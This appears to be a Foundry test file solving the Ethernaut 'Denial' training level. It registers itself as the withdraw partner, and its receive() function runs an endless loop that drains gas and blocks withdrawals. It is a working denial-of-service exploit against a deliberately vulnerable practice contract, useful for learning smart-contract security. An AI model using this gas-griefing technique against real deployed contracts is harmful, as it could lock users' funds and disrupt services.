// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_20/Denial.sol";

contract DenialTest is Test {
    Denial denial;
    address alice;
    uint256 sum;

    function setUp() public {
        alice = vm.addr(1);
        denial = new Denial();
    }

    function testAttack() public {
        denial.setWithdrawPartner(address(this));

        denial.withdraw{gas: 1_000_000}();
    }

    receive() external payable {
        // drain gas to create a DOS
        uint256 index;
        uint256 max = type(uint256).max;
        while (index < max) {
            index++;
        }
    }
}
